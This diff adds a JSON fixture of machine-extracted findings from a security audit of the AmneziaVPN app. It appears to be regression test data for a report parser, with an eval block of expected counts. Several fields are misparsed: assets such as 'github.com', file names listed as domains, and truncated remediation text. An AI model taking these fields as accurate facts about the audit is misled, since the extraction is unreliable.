+        "impact": "Potential impact includes increased attacker opportunity against Library/Preferences/org.amneziavpn.AmneziaVPN.plist if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-016 | Assets: Library/Preferences/org.amneziavpn.AmneziaVPN.plist | Services: HTTPS | URLs: https://developer.apple.com/.../nsfileprotectioncompleteuntilfirstuserauthentication, https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://developer.apple.com/documentation/security/ksecattraccessibleafterfirstunlockthisdeviceonly, https://www.zetetic.net/sqlcipher/ios-tutorial/, https://stackoverflow.com/questions/27933387/nsurlcache-and-data-protection, https://developer.apple.com/documentation/foundation/nsfileprotectioncomplete, https://developer.apple.com/documentation/.../com_apple_developer_default-data-protection | Domains: developer.apple.com, github.com, www.zetetic.net, stackoverflow.com, org.amneziavpn.AmneziaVPN.plist, tar.gz, configuration.requestCachePolicy, URLCache.shared.removeAllCachedResponses | IPs: 5.45.92.15 | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "add the Data Protection capability at the application level53",
+        "references": [
+          "https://developer.apple.com/.../nsfileprotectioncompleteuntilfirstuserauthentication",
+          "https://github.com/amnezia-vpn/desktop-client/pull/99",
+          "https://github.com/amnezia-vpn/desktop-client/pull/97",
+          "https://developer.apple.com/documentation/security/ksecattraccessibleafterfirstunlockthisdeviceonly",
+          "https://www.zetetic.net/sqlcipher/ios-tutorial/",
+          "https://stackoverflow.com/questions/27933387/nsurlcache-and-data-protection",
+          "https://developer.apple.com/documentation/foundation/nsfileprotectioncomplete",
+          "https://developer.apple.com/documentation/.../com_apple_developer_default-data-protection",
+          "developer.apple.com",
+          "github.com",
+          "www.zetetic.net",
+          "stackoverflow.com",
+          "org.amneziavpn.AmneziaVPN.plist",
+          "tar.gz",
+          "configuration.requestCachePolicy",
+          "URLCache.shared.removeAllCachedResponses",
+          "5.45.92.15"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "config access via missing ios data protection",
+        "normalizedAsset": "library/preferences/org.amneziavpn.amneziavpn.plist",
+        "canonicalKey": "AVP-01-016|config access via missing ios data protection|library preferences org amneziavpn amneziavpn plist||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Config Access via missing iOS Data Protection",
+        "sourceText": "AVP-01-016 WP1: Config Access via missing iOS Data Protection (Medium) 26",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Config Access via missing iOS Data Protection",
+      "canonicalKey": "AVP-01-016|config access via missing ios data protection|library preferences org amneziavpn amneziavpn plist||||||"
+    },
+    {
+      "id": "F-7asecurity-012",
+      "slug": "android-application-hardening-recommendations-android-8",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Android Application Hardening Recommendations",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "Android 8",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Android Application Hardening Recommendations affecting Android 8; extractor found product Android 8. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against Android 8 if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-007 | Products: Android 8 | Assets: AndroidManifest.xml | Services: HTTP, Ftp | URLs: http://blogs.quovantis.com/best-practices-to-avoid-security-vulnerabilities-in-your-ios-app/ | Domains: blogs.quovantis.com, AndroidManifest.xml | File paths: AndroidManifest.xml, network_security_config.xml | File names: AndroidManifest.xml, network_security_config.xml | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "explicitly set the android:usesCleartextTraffic attribute to false in",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.503Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Android Application Hardening Recommendations",
+        "severity": "Low",
+        "asset": "Android 8",
+        "status": "In Review",
+        "summary": "Android Application Hardening Recommendations affecting Android 8; extractor found product Android 8. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against Android 8 if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-007 | Products: Android 8 | Assets: AndroidManifest.xml | Services: HTTP, Ftp | URLs: http://blogs.quovantis.com/best-practices-to-avoid-security-vulnerabilities-in-your-ios-app/ | Domains: blogs.quovantis.com, AndroidManifest.xml | File paths: AndroidManifest.xml, network_security_config.xml | File names: AndroidManifest.xml, network_security_config.xml | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "explicitly set the android:usesCleartextTraffic attribute to false in",
+        "references": [
+          "http://blogs.quovantis.com/best-practices-to-avoid-security-vulnerabilities-in-your-ios-app/",
+          "blogs.quovantis.com",
+          "AndroidManifest.xml"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "android application hardening recommendations",
+        "normalizedAsset": "android 8",
+        "canonicalKey": "AVP-01-007|android application hardening recommendations|android 8||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Android Application Hardening Recommendations",
+        "sourceText": "AVP-01-007 WP1: Android Application Hardening Recommendations (Low) 29",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Android Application Hardening Recommendations",
+      "canonicalKey": "AVP-01-007|android application hardening recommendations|android 8||||||"
+    },
+    {
+      "id": "F-7asecurity-013",
+      "slug": "missing-android-root-ios-jailbreak-detection-the-app-in-such-an-environment",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Missing Android root & iOS Jailbreak Detection",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "the app in such an environment",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Missing Android root & iOS Jailbreak Detection affecting the app in such an environment; extractor found product the app in such an environment. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against the app in such an environment if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-008 | Products: the app in such an environment | Assets: cocoapods.org | Services: HTTPS | URLs: https://cocoapods.org/pods/IOSSecuritySuite | Domains: cocoapods.org | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "implement a root detection solution to address this problem",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.504Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Missing Android root & iOS Jailbreak Detection",
+        "severity": "Low",
+        "asset": "the app in such an environment",
+        "status": "In Review",
+        "summary": "Missing Android root & iOS Jailbreak Detection affecting the app in such an environment; extractor found product the app in such an environment. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against the app in such an environment if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-008 | Products: the app in such an environment | Assets: cocoapods.org | Services: HTTPS | URLs: https://cocoapods.org/pods/IOSSecuritySuite | Domains: cocoapods.org | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "implement a root detection solution to address this problem",
+        "references": [
+          "https://cocoapods.org/pods/IOSSecuritySuite",
+          "cocoapods.org"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "missing android root & ios jailbreak detection",
+        "normalizedAsset": "the app in such an environment",
+        "canonicalKey": "AVP-01-008|missing android root ios jailbreak detection|the app in such an environment||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Missing Android root & iOS Jailbreak Detection",
+        "sourceText": "AVP-01-008 WP1: Missing Android root & iOS Jailbreak Detection (Info) 30",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Missing Android root & iOS Jailbreak Detection",
+      "canonicalKey": "AVP-01-008|missing android root ios jailbreak detection|the app in such an environment||||||"
+    },
+    {
+      "id": "F-7asecurity-014",
+      "slug": "android-binary-hardening-recommendations-github-com",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Android Binary Hardening Recommendations",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "github.com",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Android Binary Hardening Recommendations affecting github.com; extractor found type Buffer Overflow. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against github.com if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-009 | Assets: github.com | Services: HTTPS, HTTP | URLs: https://github.com/scottyab/rootbeer, https://repo.rpgfarm.com/, http://apt.thebigboss.org/repofiles/cydia/, https://ios.jjolano.me/, http://ryleyangus.com/repo/, https://github.com/securing/IOSSecuritySuite, https://github.com/thii/DTTJailbreakDetection, https://sabatsachin.medium.com/detect-jailbreak-device-in-swift-5-ios-programatically-da467028242d | Domains: github.com, repo.rpgfarm.com, apt.thebigboss.org, ios.jjolano.me, ryleyangus.com, sabatsachin.medium.com, v8a.so, libovpnexec.so | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "compile all binaries using the -D_FORTIFY_SOURCE=2 argument",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.505Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Android Binary Hardening Recommendations",
+        "severity": "Low",
+        "asset": "github.com",
+        "status": "In Review",
+        "summary": "Android Binary Hardening Recommendations affecting github.com; extractor found type Buffer Overflow. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against github.com if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-009 | Assets: github.com | Services: HTTPS, HTTP | URLs: https://github.com/scottyab/rootbeer, https://repo.rpgfarm.com/, http://apt.thebigboss.org/repofiles/cydia/, https://ios.jjolano.me/, http://ryleyangus.com/repo/, https://github.com/securing/IOSSecuritySuite, https://github.com/thii/DTTJailbreakDetection, https://sabatsachin.medium.com/detect-jailbreak-device-in-swift-5-ios-programatically-da467028242d | Domains: github.com, repo.rpgfarm.com, apt.thebigboss.org, ios.jjolano.me, ryleyangus.com, sabatsachin.medium.com, v8a.so, libovpnexec.so | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "compile all binaries using the -D_FORTIFY_SOURCE=2 argument",
+        "references": [
+          "https://github.com/scottyab/rootbeer",
+          "https://repo.rpgfarm.com/",
+          "http://apt.thebigboss.org/repofiles/cydia/",
+          "https://ios.jjolano.me/",
+          "http://ryleyangus.com/repo/",
+          "https://github.com/securing/IOSSecuritySuite",
+          "https://github.com/thii/DTTJailbreakDetection",
+          "https://sabatsachin.medium.com/detect-jailbreak-device-in-swift-5-ios-programatically-da467028242d",
+          "github.com",
+          "repo.rpgfarm.com",
+          "apt.thebigboss.org",
+          "ios.jjolano.me",
+          "ryleyangus.com",
+          "sabatsachin.medium.com",
+          "v8a.so",
+          "libovpnexec.so"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "android binary hardening recommendations",
+        "normalizedAsset": "github.com",
+        "canonicalKey": "AVP-01-009|android binary hardening recommendations|github com||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Android Binary Hardening Recommendations",
+        "sourceText": "AVP-01-009 WP1: Android Binary Hardening Recommendations (Info) 31",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Android Binary Hardening Recommendations",
+      "canonicalKey": "AVP-01-009|android binary hardening recommendations|github com||||||"
+    },
+    {
+      "id": "F-7asecurity-015",
+      "slug": "possible-theft-of-credentials-via-plaintext-storage-github-com",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "WP1/2: Possible Theft of Credentials via Plaintext Storage",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "github.com",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Possible Theft of Credentials via Plaintext Storage affecting github.com; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against github.com if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-012 | Assets: github.com | Services: SSH, HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://owasp.org/www-project-cheat-sheets/cheatsheets/Cryptographic_Storage_Cheat_Sheet, https://www.meziantou.net/how-to-store-a-password-on-windows.htm, https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection, https://pureinfotech.com/credential-manager-windows-10/, https://developer.apple.com/.../.../keys/storing_keys_in_the_keychain, https://developer.android.com/training/articles/keystore, https://developer.android.com/topic/security/data, https://www.zetetic.net/sqlcipher/ | Domains: github.com, owasp.org, www.meziantou.net, docs.microsoft.com, pureinfotech.com, developer.apple.com, developer.android.com, www.zetetic.net, org.amneziavpn.AmneziaVPN.plist, how-to-store-a-password-on-windows.htm | IPs: 5.45.92.15 | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "leverage the appropriate security enclave for the platform in order",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.506Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Possible Theft of Credentials via Plaintext Storage",
+        "severity": "Low",
+        "asset": "github.com",
+        "status": "In Review",
+        "summary": "Possible Theft of Credentials via Plaintext Storage affecting github.com; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against github.com if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-012 | Assets: github.com | Services: SSH, HTTPS | URLs: https://github.com/amnezia-vpn/desktop-client/pull/99, https://github.com/amnezia-vpn/desktop-client/pull/97, https://owasp.org/www-project-cheat-sheets/cheatsheets/Cryptographic_Storage_Cheat_Sheet, https://www.meziantou.net/how-to-store-a-password-on-windows.htm, https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection, https://pureinfotech.com/credential-manager-windows-10/, https://developer.apple.com/.../.../keys/storing_keys_in_the_keychain, https://developer.android.com/training/articles/keystore, https://developer.android.com/topic/security/data, https://www.zetetic.net/sqlcipher/ | Domains: github.com, owasp.org, www.meziantou.net, docs.microsoft.com, pureinfotech.com, developer.apple.com, developer.android.com, www.zetetic.net, org.amneziavpn.AmneziaVPN.plist, how-to-store-a-password-on-windows.htm | IPs: 5.45.92.15 | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "leverage the appropriate security enclave for the platform in order",
+        "references": [
+          "https://github.com/amnezia-vpn/desktop-client/pull/99",
+          "https://github.com/amnezia-vpn/desktop-client/pull/97",
+          "https://owasp.org/www-project-cheat-sheets/cheatsheets/Cryptographic_Storage_Cheat_Sheet",
+          "https://www.meziantou.net/how-to-store-a-password-on-windows.htm",
+          "https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection",
+          "https://pureinfotech.com/credential-manager-windows-10/",
+          "https://developer.apple.com/.../.../keys/storing_keys_in_the_keychain",
+          "https://developer.android.com/training/articles/keystore",
+          "https://developer.android.com/topic/security/data",
+          "https://www.zetetic.net/sqlcipher/",
+          "github.com",
+          "owasp.org",
+          "www.meziantou.net",
+          "docs.microsoft.com",
+          "pureinfotech.com",
+          "developer.apple.com",
+          "developer.android.com",
+          "www.zetetic.net",
+          "org.amneziavpn.AmneziaVPN.plist",
+          "how-to-store-a-password-on-windows.htm",
+          "5.45.92.15"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "possible theft of credentials via plaintext storage",
+        "normalizedAsset": "github.com",
+        "canonicalKey": "AVP-01-012|possible theft of credentials via plaintext storage|github com||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "WP1/2: Possible Theft of Credentials via Plaintext Storage",
+        "sourceText": "AVP-01-012 WP1/2: Possible Theft of Credentials via Plaintext Storage (Low) 32",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "reported"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "WP1/2: Possible Theft of Credentials via Plaintext Storage",
+      "canonicalKey": "AVP-01-012|possible theft of credentials via plaintext storage|github com||||||"
+    },
+    {
+      "id": "F-7asecurity-016",
+      "slug": "possible-weaknesses-via-insecure-function-usage-en-amnezia-org",
+      "reportId": "G-7asecurity-amneziavpn",
+      "reportName": "7asecurity-amneziavpn",
+      "title": "Possible Weaknesses via Insecure Function Usage",
+      "cve": "—",
+      "severity": "Low",
+      "asset": "en.amnezia.org",
+      "score": 35,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:29:04.354Z",
+      "summary": "Possible Weaknesses via Insecure Function Usage affecting en.amnezia.org; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "impact": "Potential impact includes increased attacker opportunity against en.amnezia.org if this signal is not reviewed.",
+      "evidence": "Finding IDs: AVP-01-013 | Assets: en.amnezia.org | Services: HTTPS | URLs: https://en.amnezia.org/, https://play.google.com/store/apps/details?id=org.amnezia.vpn, https://github.com/amnezia-vpn/desktop-client/tree/master/client/android, https://github.com/amnezia-vpn/desktop-client/tree/dev/client/ios, https://github.com/amnezia-vpn/desktop-client | Domains: en.amnezia.org, play.google.com, github.com, org.amnezia.vpn | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:29:13.509Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Profile-bounded extraction used to keep this report family stable for regression and training"
+        }
+      ],
+      "reported": {
+        "title": "Possible Weaknesses via Insecure Function Usage",
+        "severity": "Low",
+        "asset": "en.amnezia.org",
+        "status": "In Review",
+        "summary": "Possible Weaknesses via Insecure Function Usage affecting en.amnezia.org; extractor found security indicators from the submitted report. Warning: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "impact": "Potential impact includes increased attacker opportunity against en.amnezia.org if this signal is not reviewed.",
+        "evidence": "Finding IDs: AVP-01-013 | Assets: en.amnezia.org | Services: HTTPS | URLs: https://en.amnezia.org/, https://play.google.com/store/apps/details?id=org.amnezia.vpn, https://github.com/amnezia-vpn/desktop-client/tree/master/client/android, https://github.com/amnezia-vpn/desktop-client/tree/dev/client/ios, https://github.com/amnezia-vpn/desktop-client | Domains: en.amnezia.org, play.google.com, github.com, org.amnezia.vpn | Warnings: Profile-bounded extraction used to keep this report family stable for regression and training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+        "references": [
+          "https://en.amnezia.org/",
+          "https://play.google.com/store/apps/details?id=org.amnezia.vpn",
+          "https://github.com/amnezia-vpn/desktop-client/tree/master/client/android",
+          "https://github.com/amnezia-vpn/desktop-client/tree/dev/client/ios",
+          "https://github.com/amnezia-vpn/desktop-client",
+          "en.amnezia.org",
+          "play.google.com",
+          "github.com",
+          "org.amnezia.vpn"
+        ]
+      },
+      "normalization": {
+        "normalizedTitle": "possible weaknesses via insecure function usage",
+        "normalizedAsset": "en.amnezia.org",
+        "canonicalKey": "AVP-01-013|possible weaknesses via insecure function usage|en amnezia org||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Possible Weaknesses via Insecure Function Usage",
+        "sourceText": "AVP-01-013 WP2: Possible Weaknesses via Insecure Function Usage (Low) 34",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "reported",
+          "asset": "reported",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        },
+        "method": "generic-official-index-alignment"
+      },
+      "method": "generic-official-index-alignment",
+      "sourceSectionTitle": "Possible Weaknesses via Insecure Function Usage",
+      "canonicalKey": "AVP-01-013|possible weaknesses via insecure function usage|en amnezia org||||||"
+    }
+  ],
+  "eval": {
+    "enableNlp": true,
+    "expectedCount": 16,
+    "actualCount": 16,
+    "expectedSeverityCounts": {
+      "Critical": 3,
+      "High": 1,
+      "Medium": 6,
+      "Low": 6
+    },
+    "actualSeverityCounts": {
+      "Critical": 3,
+      "High": 1,
+      "Medium": 6,
+      "Low": 6
+    },
+    "duplicates": 0,
+    "negativeHits": 0,
+    "pass": true
+  }
+}
